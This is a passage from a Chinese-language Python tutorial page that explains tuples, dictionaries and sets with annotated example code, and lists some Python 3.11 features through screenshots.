列表生成式生成一个4行5列的二维列表</span><br>lst2=[[j <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(5)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(4)]<br><span class="hljs-built_in">print</span>(lst2)<br><br></code></pre></td></tr></table></figure><h2 id="4-元组类型"><a href="#4-元组类型" class="headerlink" title="4.元组类型"></a>4.元组类型</h2><h3 id="1-元组定义"><a href="#1-元组定义" class="headerlink" title="1.元组定义"></a>1.元组定义</h3><p>是Python中内置的不可变序列 </p><p>在Python中使用()定义元组，元素与元素之间使用英文的逗号分隔 </p><p>元组中只有一个元素的时候，逗号也不能省略</p><h3 id="2-元组的创建方式有两种"><a href="#2-元组的创建方式有两种" class="headerlink" title="2.元组的创建方式有两种"></a>2.元组的创建方式有两种</h3><h4 id="1-使用-直接创建元组"><a href="#1-使用-直接创建元组" class="headerlink" title="1.使用()直接创建元组"></a>1.使用()直接创建元组</h4><p> 语法结构如下： </p><p>元组名&#x3D;（element1，element2,……,elementN） </p><h4 id="2-使用内置函数tuple-创建元组"><a href="#2-使用内置函数tuple-创建元组" class="headerlink" title="2.使用内置函数tuple()创建元组"></a>2.使用内置函数tuple()创建元组</h4><p>语法结构如下： </p><p>元组名&#x3D;tuple(序列)</p><h4 id="3-删除元组"><a href="#3-删除元组" class="headerlink" title="3.删除元组"></a>3.删除元组</h4><p>del 元组名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-12元组的创建与删除</span><br><span class="hljs-comment"># 使用小括号创建元组</span><br>t=(<span class="hljs-string">&#x27;hello&#x27;</span>,[10,20,30],<span class="hljs-string">&#x27;python&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>)<br><span class="hljs-built_in">print</span>(t)<br><span class="hljs-comment"># 使用内置函数tuple()创建元组</span><br><span class="hljs-attribute">t</span>=tuple(&#x27;helloworld&#x27;)<br><span class="hljs-built_in">print</span>(t)<br><span class="hljs-attribute">t</span>=tuple([10,20,30,40])<br><span class="hljs-built_in">print</span>(t)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;10在元组中是否存在：&#x27;</span>,(10 <span class="hljs-keyword">in</span> t))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;10在元组中是否不存在：&#x27;</span>,(10 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> t))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;最大值：&#x27;</span>,max(t))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;最小值：&#x27;</span>,min(t))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;len：&#x27;</span>,len(t))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;t.index：&#x27;</span>,t.index(10))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;t.count：&#x27;</span>,t.count(10))<br><span class="hljs-comment"># 如果元组中只有一个元素</span><br>t=(10)<br><span class="hljs-built_in">print</span>(t,type(t))<br><span class="hljs-comment"># 如果元组中只有一个元素，逗号不能省</span><br>y=(10,)<br><span class="hljs-built_in">print</span>(y,type(y))<br><span class="hljs-comment"># 元组的删除</span><br>del t<br><span class="hljs-comment"># print(t)</span><br><span class="hljs-comment"># 示例5-13元组元素的访问与遍历</span><br>t=(<span class="hljs-string">&#x27;python&#x27;</span>,<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>)<br><span class="hljs-comment">#　根据索引访问元组</span><br><span class="hljs-built_in">print</span>(t[0])<br><span class="hljs-attribute">t2</span>=t[0:3:2] # 元组支持切片操作<br><span class="hljs-built_in">print</span>(t2)<br><span class="hljs-comment"># 元组的遍历</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> t:<br>    <span class="hljs-built_in">print</span>(item)<br><span class="hljs-comment"># for+range()+len()</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t)):<br>    <span class="hljs-built_in">print</span>(i,<span class="hljs-string">&#x27;--&gt;&#x27;</span>,t[i])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;--------------------&#x27;</span>)<br><span class="hljs-comment"># 使用enumerate()</span><br><span class="hljs-keyword">for</span> index,item <span class="hljs-keyword">in</span> enumerate(t):<br>    <span class="hljs-built_in">print</span>(index,<span class="hljs-string">&#x27;--&gt;&#x27;</span>,item)<br><span class="hljs-keyword">for</span> index,item <span class="hljs-keyword">in</span> enumerate(t,<span class="hljs-attribute">start</span>=11): #　序号从11开始<br>    <span class="hljs-built_in">print</span>(index,<span class="hljs-string">&#x27;--&gt;&#x27;</span>,item)<br><span class="hljs-comment"># 示例5-14元组生成式</span><br>t=(i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,4))<br><span class="hljs-built_in">print</span>(t)<br><span class="hljs-comment"># t=tuple(t)</span><br><span class="hljs-comment"># print(t)</span><br><span class="hljs-comment"># 遍历</span><br><span class="hljs-comment"># for item in t:</span><br><span class="hljs-comment">#     print(item)</span><br><span class="hljs-built_in">print</span>(t.__next__())<br><span class="hljs-built_in">print</span>(t.__next__())<br><span class="hljs-built_in">print</span>(t.__next__())<br><span class="hljs-attribute">t</span>=tuple(t)<br><span class="hljs-built_in">print</span>(t)<br></code></pre></td></tr></table></figure><h4 id="4-元组和列表的区别"><a href="#4-元组和列表的区别" class="headerlink" title="4.元组和列表的区别"></a>4.元组和列表的区别</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171059146.png" alt="image-20251024160935390"></p><h2 id="5-字典类型"><a href="#5-字典类型" class="headerlink" title="5.字典类型"></a>5.字典类型</h2><h3 id="1-字典定义"><a href="#1-字典定义" class="headerlink" title="1.字典定义"></a>1.字典定义</h3><p>字典类型是根据一个信息查找另一个信息的方式构成了“键值对”，它表示索引用的键和对应的值构成的成 对关系</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171100689.png" alt="image-20251024160951067"></p><h3 id="2-字典的创建方式"><a href="#2-字典的创建方式" class="headerlink" title="2.字典的创建方式"></a>2.字典的创建方式</h3><h4 id="1-使用-直接创建字典"><a href="#1-使用-直接创建字典" class="headerlink" title="1.使用{}直接创建字典"></a>1.使用{}直接创建字典</h4><p>d&#x3D;{key1:value1,key2:value2……}</p><h4 id="2-使用内置函数dict-创建字典"><a href="#2-使用内置函数dict-创建字典" class="headerlink" title="2.使用内置函数dict()创建字典"></a>2.使用内置函数dict()创建字典</h4><h5 id="1-通过映射函数创建字典"><a href="#1-通过映射函数创建字典" class="headerlink" title="(1)通过映射函数创建字典"></a>(1)通过映射函数创建字典</h5><p>zip(lst1,lst2)</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171102376.png" alt="image-20251024161030732"></p><h5 id="2-使用参数创建字典"><a href="#2-使用参数创建字典" class="headerlink" title="(2)使用参数创建字典"></a>(2)使用参数创建字典</h5><p>语法结构如下： dict(key&#x3D;value1,key2&#x3D;value2……)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-15字典的创建与删除</span><br><span class="hljs-comment"># （1）创建字典</span><br>d = &#123;10: <span class="hljs-string">&#x27;cat&#x27;</span>, 20: <span class="hljs-string">&#x27;dog&#x27;</span>, 30: <span class="hljs-string">&#x27;pet&#x27;</span>, 20: <span class="hljs-string">&#x27;zoo&#x27;</span>&#125;<br><span class="hljs-built_in">print</span>(d)  # key相同时，value值进行了覆盖<br><span class="hljs-comment"># （2）zip函数</span><br>lst1 = [10, 20, 30, 40]<br>lst2 = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;pet&#x27;</span>, <span class="hljs-string">&#x27;zoo&#x27;</span>, <span class="hljs-string">&#x27;car&#x27;</span>]<br>zipobj = zip(lst1, lst2)<br><span class="hljs-built_in">print</span>(zipobj)  # &lt;zip object at 0x000001CB59561580&gt;<br><span class="hljs-comment"># print(list(zipobj)) # [(10, &#x27;cat&#x27;), (20, &#x27;dog&#x27;), (30, &#x27;pet&#x27;), (40, &#x27;zoo&#x27;)]</span><br><span class="hljs-attribute">d</span>=dict(zipobj)<br><span class="hljs-built_in">print</span>(d) # &#123;10: <span class="hljs-string">&#x27;cat&#x27;</span>, 20: <span class="hljs-string">&#x27;dog&#x27;</span>, 30: <span class="hljs-string">&#x27;pet&#x27;</span>, 40: <span class="hljs-string">&#x27;zoo&#x27;</span>&#125;<br><span class="hljs-comment"># 使用参数创建字典</span><br><span class="hljs-attribute">d</span>=dict(cat=10,dog=20) # 左侧cat是key，右侧的是value<br><span class="hljs-built_in">print</span>(d)<br>t=(10,20,30)<br><span class="hljs-built_in">print</span>(&#123;t:10&#125;) # t是key，10是value，元组是可以作为字典中的key<br><span class="hljs-comment"># lst=[10,20,30]</span><br><span class="hljs-comment"># print(&#123;lst:10&#125;) # TypeError: unhashable type: &#x27;list&#x27;</span><br><span class="hljs-comment"># 字典属于序列</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;max:&#x27;</span>,max(d))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;min:&#x27;</span>,min(d))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;len:&#x27;</span>,len(d))<br><span class="hljs-comment"># 字典的删除</span><br>del d<br><span class="hljs-comment"># print(d) # NameError: name &#x27;d&#x27; is not defined</span><br><br></code></pre></td></tr></table></figure><p><strong>注意事项：</strong>  </p><p>字典中的key是无序的，Python3.5及其之前的版本字典的key在输出时无序，但是从Python3.6版本之后 Python解释器进行了处理所以才会看到输出的顺序与添加的顺序“一致”</p><h3 id="3-字典元素的取值"><a href="#3-字典元素的取值" class="headerlink" title="3.字典元素的取值"></a>3.字典元素的取值</h3><p>d[key] 或 d.get(key)</p><h3 id="4-字典元素的遍历"><a href="#4-字典元素的遍历" class="headerlink" title="4.字典元素的遍历"></a>4.字典元素的遍历</h3><h4 id="1-遍历出key与value的元组"><a href="#1-遍历出key与value的元组" class="headerlink" title="(1)遍历出key与value的元组"></a>(1)遍历出key与value的元组</h4><p>  for element in d.items(): pass </p><h4 id="2-分别遍历出key和value"><a href="#2-分别遍历出key和value" class="headerlink" title="(2)分别遍历出key和value"></a>(2)分别遍历出key和value</h4><p>  for key,value in d.items(): </p><p>​pass</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-16字典元素的访问和遍历</span><br>d=&#123;<span class="hljs-string">&#x27;hello&#x27;</span>:10,<span class="hljs-string">&#x27;world&#x27;</span>:20,<span class="hljs-string">&#x27;python&#x27;</span>:30&#125;<br><span class="hljs-comment"># 访问字典中的元素</span><br><span class="hljs-comment"># （1）使用d[key]</span><br><span class="hljs-built_in">print</span>(d[<span class="hljs-string">&#x27;hello&#x27;</span>])<br><span class="hljs-comment"># （2）d.get(key)</span><br><span class="hljs-built_in">print</span>(d.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;hello&#x27;</span>))<br><span class="hljs-comment"># 二者之间是有区别的，如果key不存在，d[key]报错，d.get(key)可以指定默认值</span><br><span class="hljs-comment"># print(d[&#x27;java&#x27;]) # KeyError: &#x27;java&#x27;</span><br><span class="hljs-built_in">print</span>(d.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;java&#x27;</span>)) # None<br><span class="hljs-built_in">print</span>(d.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;不存在&#x27;</span>))<br><span class="hljs-comment"># 字典的遍历</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> d.items():<br>    <span class="hljs-built_in">print</span>(item) # <span class="hljs-attribute">key</span>=value组成的一个元素<br><span class="hljs-comment"># 在使用for循环遍历时，分别获取key,value</span><br><span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> d.items():<br>    <span class="hljs-built_in">print</span>(key,<span class="hljs-string">&#x27;--&gt;&#x27;</span>,value)<br><br></code></pre></td></tr></table></figure><h3 id="5-字典的相关操作方法"><a href="#5-字典的相关操作方法" class="headerlink" title="5.字典的相关操作方法"></a>5.字典的相关操作方法</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171106049.png" alt="image-20251024161201492"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171108196.png" alt="image-20251024161207523"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-17字典的相关操作方法</span><br>d=&#123;1001:<span class="hljs-string">&#x27;李梅&#x27;</span>,1002:<span class="hljs-string">&#x27;王华&#x27;</span>,1003:<span class="hljs-string">&#x27;张峰&#x27;</span>&#125;<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-comment">#　向字典中添加元素</span><br>d[1004]=<span class="hljs-string">&#x27;张丽丽&#x27;</span> # 直接使用赋值运算符向字典中添加元素<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-comment"># 获取字典中所有的key</span><br><span class="hljs-attribute">keys</span>=d.keys()<br><span class="hljs-built_in">print</span>(keys) # dict_keys([1001, 1002, 1003, 1004])<br><span class="hljs-built_in">print</span>(list(keys))<br><span class="hljs-built_in">print</span>(tuple(keys))<br><span class="hljs-comment"># 获取字典中所有的value</span><br><span class="hljs-attribute">values</span>=d.values()<br><span class="hljs-built_in">print</span>(values) # dict_values([<span class="hljs-string">&#x27;李梅&#x27;</span>, <span class="hljs-string">&#x27;王华&#x27;</span>, <span class="hljs-string">&#x27;张峰&#x27;</span>, <span class="hljs-string">&#x27;张丽丽&#x27;</span>])<br><span class="hljs-built_in">print</span>(list(values))<br><span class="hljs-built_in">print</span>(tuple(values))<br><span class="hljs-comment">#　如果将字典中的数据转成key-value的形式，以元组的方式进行展现</span><br><span class="hljs-attribute">lst</span>=list(d.items())<br><span class="hljs-built_in">print</span>(lst)<br><span class="hljs-attribute">d</span>=dict(lst)<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-comment">#　使用pop函数</span><br><span class="hljs-built_in">print</span>(d.pop(1001))<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-built_in">print</span>(d.pop(1008,<span class="hljs-string">&#x27;不存在&#x27;</span>))<br><span class="hljs-comment"># 随机删除</span><br><span class="hljs-built_in">print</span>(d.popitem())<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-comment">#　清空字典中所有的元素</span><br>d.clear()<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-comment"># Python中一切皆对象，每个对象都有一个布尔值</span><br><span class="hljs-built_in">print</span>(bool(d)) # <span class="hljs-literal">False</span><br><br></code></pre></td></tr></table></figure><h3 id="6-字典生成式"><a href="#6-字典生成式" class="headerlink" title="6.字典生成式"></a>6.字典生成式</h3><p>d&#x3D;{key:value for item in range}</p><p> d&#x3D;{key:value for key,value in zip(lst1,lst2)}</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs processing"># 示例<span class="hljs-number">5</span><span class="hljs-number">-18</span>字典生成式<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">random</span><br>d=&#123;item :<span class="hljs-built_in">random</span>.<span class="hljs-property">randint</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>) <span class="hljs-keyword">for</span> item in <span class="hljs-title function_">range</span>(<span class="hljs-number">4</span>)&#125;<br><span class="hljs-built_in">print</span>(d)<br># 创建两个列表<br>lst=[<span class="hljs-number">1001</span>,<span class="hljs-number">1002</span>,<span class="hljs-number">1003</span>]<br>lst2=[<span class="hljs-string">&#x27;陈梅梅&#x27;</span>,<span class="hljs-string">&#x27;王一一&#x27;</span>,<span class="hljs-string">&#x27;李丽丽&#x27;</span>]<br>d=&#123;<span class="hljs-built_in">key</span>:value <span class="hljs-keyword">for</span> <span class="hljs-built_in">key</span>,value in <span class="hljs-title function_">zip</span>(lst,lst2)&#125;<br><span class="hljs-built_in">print</span>(d)<br><br></code></pre></td></tr></table></figure><h2 id="6-集合类型"><a href="#6-集合类型" class="headerlink" title="6.集合类型"></a>6.集合类型</h2><h3 id="1-集合定义"><a href="#1-集合定义" class="headerlink" title="1.集合定义"></a>1.集合定义</h3><p>Python中的集合与数学中集合的概念一致</p><p> Python中的集合是一个无序的不重复元素序列 </p><p>集合中只能存储不可变数据类型 </p><p>在Python中集合使用{}定义 </p><p>与列表、字典一样，都是Python中的可变数据类型</p><h3 id="2-集合的创建方式有两种"><a href="#2-集合的创建方式有两种" class="headerlink" title="2.集合的创建方式有两种"></a>2.集合的创建方式有两种</h3><h4 id="1-使用-直接创建集合-语法结构如下："><a href="#1-使用-直接创建集合-语法结构如下：" class="headerlink" title="(1)使用{}直接创建集合  语法结构如下："></a>(1)使用{}直接创建集合  语法结构如下：</h4><p> s&#x3D;{element1,element2,……elementN} </p><h4 id="2-使用内置函数set-创建集合-语法结构如下："><a href="#2-使用内置函数set-创建集合-语法结构如下：" class="headerlink" title="(2)使用内置函数set()创建集合  语法结构如下："></a>(2)使用内置函数set()创建集合  语法结构如下：</h4><p> s&#x3D;set(可迭代对象)</p><h3 id="3-集合的删除"><a href="#3-集合的删除" class="headerlink" title="3.集合的删除"></a>3.集合的删除</h3><p>语法结构如下： </p><p>del 集合名</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"># 示例<span class="hljs-number">5</span><span class="hljs-number">-19</span>集合的创建与删除<br># &#123;&#125;直接创建集合<br>s = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;<br>print(s)<br># 集合只能存储不可变数据类型<br># s=&#123;[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>],[<span class="hljs-number">30</span>,<span class="hljs-number">40</span>]&#125; # TypeError: unhashable type: <span class="hljs-string">&#x27;list&#x27;</span><br># print(s)<br># 使用<span class="hljs-keyword">set</span>()创建集合<br>s = <span class="hljs-keyword">set</span>()  # 创建了一个空集合，空集合的布尔值是False<br>print(s)<br>s = &#123;&#125;  # 创建的是集合还是字典呢？<br>print(s,type(s)) # &lt;<span class="hljs-keyword">class</span> &#x27;<span class="hljs-symbol">dict</span>&#x27;&gt;<br><span class="hljs-symbol">s</span>=<span class="hljs-symbol">set</span>(&#x27;<span class="hljs-symbol">helloworld</span>&#x27;)<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s</span>)<br><span class="hljs-symbol">s2</span>=<span class="hljs-symbol">set</span>([<span class="hljs-symbol">10,<span class="hljs-symbol">20</span>,<span class="hljs-symbol">30</span></span>])<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s2</span>)<br><span class="hljs-symbol">s3</span>=<span class="hljs-symbol">set</span>(<span class="hljs-symbol">range</span>(<span class="hljs-symbol">1,<span class="hljs-symbol">10</span></span>))<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s3</span>)<br># 集合属于序列的一种<br><span class="hljs-symbol">print</span>(&#x27;<span class="hljs-symbol">max:</span>&#x27;,<span class="hljs-symbol">max</span>(<span class="hljs-symbol">s3</span>))<br><span class="hljs-symbol">print</span>(&#x27;<span class="hljs-symbol">min:</span>&#x27;,<span class="hljs-symbol">min</span>(<span class="hljs-symbol">s3</span>))<br><span class="hljs-symbol">print</span>(&#x27;<span class="hljs-symbol">len:</span>&#x27;,<span class="hljs-symbol">len</span>(<span class="hljs-symbol">s3</span>))<br><span class="hljs-symbol">print</span>(&#x27;<span class="hljs-symbol">9</span>在集合中存在吗？&#x27;,(<span class="hljs-symbol">9</span> <span class="hljs-symbol">in</span> <span class="hljs-symbol">s3</span>))<br><span class="hljs-symbol">print</span>(&#x27;<span class="hljs-symbol">9</span>在集合中不存在吗？&#x27;,(<span class="hljs-symbol">9</span> <span class="hljs-symbol">not</span> <span class="hljs-symbol">in</span> <span class="hljs-symbol">s3</span>))<br>#　集合的删除操作<br><span class="hljs-symbol">del</span> <span class="hljs-symbol">s3</span><br># <span class="hljs-symbol">print</span>(<span class="hljs-symbol">s3</span>) # <span class="hljs-symbol">NameError: <span class="hljs-symbol">name</span></span> &#x27;<span class="hljs-symbol">s3</span>&#x27; <span class="hljs-symbol">is</span> <span class="hljs-symbol">not</span> <span class="hljs-symbol">defined</span><br><br></code></pre></td></tr></table></figure><h3 id="4-集合类型的操作符"><a href="#4-集合类型的操作符" class="headerlink" title="4.集合类型的操作符"></a>4.集合类型的操作符</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171112942.png" alt="image-20251024161406403"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#　示例5-20集合的操作符</span><br><span class="hljs-attribute">A</span>=&#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;<br><span class="hljs-attribute">B</span>=&#123;<span class="hljs-number">30</span>,<span class="hljs-number">50</span>,<span class="hljs-number">88</span>,<span class="hljs-number">76</span>,<span class="hljs-number">20</span>&#125;<br><span class="hljs-comment"># 交集操作</span><br><span class="hljs-attribute">print</span>(A&amp;B)<br><span class="hljs-comment"># 并集操作</span><br><span class="hljs-attribute">print</span>(A|B)<br><span class="hljs-comment"># 差集操作</span><br><span class="hljs-attribute">print</span>(A-B)<br><span class="hljs-attribute">print</span>(B-A)<br><span class="hljs-comment"># 补集操作</span><br><span class="hljs-attribute">print</span>(A^B)<br><br></code></pre></td></tr></table></figure><h3 id="5-集合的相关操作方法"><a href="#5-集合的相关操作方法" class="headerlink" title="5.集合的相关操作方法"></a>5.集合的相关操作方法</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171150704.png" alt="image-20251024161431308"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-21集合的相关操作</span><br>s=&#123;10,20,30&#125;<br><span class="hljs-comment"># 向集合中添加元素</span><br>s.<span class="hljs-built_in">add</span>(100)<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-comment"># 删除元素</span><br>s.<span class="hljs-built_in">remove</span>(20)<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-comment"># 清除集合中所有元素</span><br><span class="hljs-comment"># s.clear()</span><br><span class="hljs-comment"># print(s)</span><br><span class="hljs-comment"># 集合的遍历操作</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-built_in">print</span>(item)<br><span class="hljs-comment"># 使用enumerate()函数</span><br><span class="hljs-keyword">for</span> index,item <span class="hljs-keyword">in</span> enumerate(s):<br>    <span class="hljs-built_in">print</span>(index,<span class="hljs-string">&#x27;--&gt;&#x27;</span>,item)<br><span class="hljs-comment"># 集合的生成式</span><br>s=&#123;i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,10) <span class="hljs-keyword">if</span> i%<span class="hljs-attribute">2</span>==1&#125;<br><span class="hljs-built_in">print</span>(s)<br><br></code></pre></td></tr></table></figure><h3 id="6-列表、元组、字典、集合的区别"><a href="#6-列表、元组、字典、集合的区别" class="headerlink" title="6.列表、元组、字典、集合的区别"></a>6.列表、元组、字典、集合的区别</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171116092.png" alt="image-20251024161457181"></p><h3 id="7-P-y-t-h-o-n-3-1-1-新-特-性"><a href="#7-P-y-t-h-o-n-3-1-1-新-特-性" class="headerlink" title="7 . P y t h o n 3 . 1 1 新 特 性"></a>7 . P y t h o n 3 . 1 1 新 特 性</h3><h4 id="1-结-构-模-式-匹-配"><a href="#1-结-构-模-式-匹-配" class="headerlink" title="1 . 结 构 模 式 匹 配"></a>1 . 结 构 模 式 匹 配</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171118170.png" alt="image-20251024161532421"></p><h4 id="2-字典合并-运-算-符"><a href="#2-字典合并-运-算-符" class="headerlink" title="2.字典合并 运 算 符|"></a>2.字典合并 运 算 符|</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171129754.png" alt="image-20251024161618826"></p><h4 id="3-同-步-迭-代"><a href="#3-同-步-迭-代" class="headerlink" title="3 . 同 步 迭 代"></a>3 . 同 步 迭 代</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171131197.png" alt="image-20251024161636130"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171134941.png" alt="image-20251024161643204"></p><h2 id="8-本章总结"><a href="#8-本章总结" class="headerlink" 